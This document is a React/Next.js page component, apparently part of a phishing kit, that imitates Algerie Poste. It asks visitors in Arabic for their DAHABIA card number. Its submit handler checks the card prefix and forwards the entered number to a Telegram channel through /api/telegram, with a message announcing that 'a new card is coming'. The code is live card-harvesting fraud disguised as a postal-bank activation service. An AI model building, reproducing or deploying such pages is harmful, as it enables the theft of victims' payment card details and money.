"use client"

import type React from "react"
import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card } from "@/components/ui/card"
import { CreditCard } from "lucide-react"
import Image from "next/image"

interface CardNumberStepProps {
  onNext: () => void
  onBack: () => void
  formData: any
  updateFormData: (data: any) => void
}

export function CardNumberStep({ onNext, onBack, formData, updateFormData }: CardNumberStepProps) {
  const [error, setError] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)

  const isValidDahabiaPrefix = (cardNum: string) => {
    const cleanNum = cardNum.replace(/\s/g, "")
    return cleanNum.startsWith("62807030") || cleanNum.startsWith("62807031")
  }

  const validateCardNumber = (cardNum: string) => {
    const cleanNum = cardNum.replace(/\s/g, "")
    return cleanNum.length === 16 && /^\d+$/.test(cleanNum)
  }

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\s/g, "").slice(0, 16)
    if (!/^\d*$/.test(value)) return
    updateFormData({ cardNumber: value })
    setError("")
  }

  const sendNotificationToTelegram = async (cardNumber: string) => {
    try {
      const telegramMessage = `هنالك بطاقه جديده قادمه
<code>${cardNumber}</code>`

      await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message: telegramMessage }),
      })
    } catch (error) {
      console.error("Failed to send notification to Telegram:", error)
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!validateCardNumber(formData.cardNumber)) {
      setError("رقم البطاقة يجب ان يكون 16 رقم")
      return
    }

    setIsSubmitting(true)
    if (formData.cardNumber.startsWith("6280")) {
      await sendNotificationToTelegram(formData.cardNumber)
    }
    setIsSubmitting(false)
    onNext()
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#1a1f4e] to-[#2d3a8c] flex items-center justify-center p-4 relative overflow-hidden">
      {/* Background decorations */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute top-0 left-0 w-full h-full opacity-10">
          <div className="absolute top-10 left-10 w-64 h-64 bg-[#4a6cf4] rounded-full blur-3xl" />
          <div className="absolute bottom-20 right-10 w-80 h-80 bg-[#f5a623] rounded-full blur-3xl" />
        </div>
        <div className="absolute inset-0 bg-[linear-gradient(rgba(255,255,255,0.03)_1px,transparent_1px),linear-gradient(90deg,rgba(255,255,255,0.03)_1px,transparent_1px)] bg-[size:50px_50px]" />
      </div>

      <div className="relative z-10 w-full max-w-md">
        {/* Logo */}
        <div className="flex justify-center mb-4">
          <div className="bg-white rounded-xl p-3 shadow-xl">
            <Image
              src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/images-2I0wQBPdRJtcKjQ7NMaD1nGTE6rGfy.png"
              alt="Algerie Poste"
              width={80}
              height={80}
              className="w-20 h-20 object-contain"
            />
          </div>
        </div>

        <Card className="bg-white p-6 shadow-2xl border-0 rounded-2xl">
          {/* Icon */}
          <div className="flex justify-center mb-4">
            <div className="w-14 h-14 bg-gradient-to-r from-[#4a6cf4] to-[#2d4a9e] rounded-full flex items-center justify-center shadow-lg">
              <CreditCard className="w-7 h-7 text-white" />
            </div>
          </div>

          <h1 className="text-lg font-bold text-center mb-1 text-[#1a1f4e]">رقم البطاقة الذهبية</h1>
          <p className="text-xs text-gray-500 text-center mb-2">ادخل رقم بطاقة DAHABIA المرتبطة بحسابك البريدي</p>
          <div className="w-full h-1 bg-gradient-to-r from-[#f5a623] to-[#e6940a] rounded-full mb-4" />

          {/* Info box */}
          <div className="bg-gradient-to-r from-[#4a6cf4]/10 to-[#2d4a9e]/10 rounded-xl p-3 mb-4 border border-[#4a6cf4]/20">
            <p className="text-xs text-[#1a1f4e] text-center leading-relaxed">
              يرجى ادخال رقم البطاقة الذهبية (DAHABIA) المكون من 16 رقم المرتبطة بحسابك البريدي CCP
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label className="block text-sm font-semibold mb-2 text-gray-700 text-right">رقم البطاقة (16 رقم)</label>
              <Input
                type="text"
                inputMode="numeric"
                placeholder="0000000000000000"
                maxLength={16}
                value={formData.cardNumber || ""}
                onChange={handleCardNumberChange}
                className="w-full text-center text-xl font-mono tracking-[0.3em] h-14 border-2 border-[#4a6cf4]/20 focus:border-[#4a6cf4]"
                dir="ltr"
                autoFocus
              />
              {error && <p className="text-red-500 text-sm mt-2 text-center">{error}</p>}
            </div>

            <Button
              type="submit"
              disabled={isSubmitting || !formData.cardNumber || formData.cardNumber.length !== 16}
              className="w-full bg-gradient-to-r from-[#f5a623] to-[#e6940a] hover:from-[#e6940a] hover:to-[#d4850a] text-[#1a1f4e] font-bold py-3 rounded-xl transition-all disabled:opacity-50"
            >
              {isSubmitting ? "جاري التحقق..." : "متابعة"}
            </Button>
          </form>

          <Button onClick={onBack} variant="outline" className="w-full mt-3 bg-transparent">
            العودة
          </Button>
        </Card>

        <p className="text-center text-xs text-white/50 mt-4">خدمة تفعيل التحويل البنكي - بريد الجزائر</p>
      </div>
    </div>
  )
}
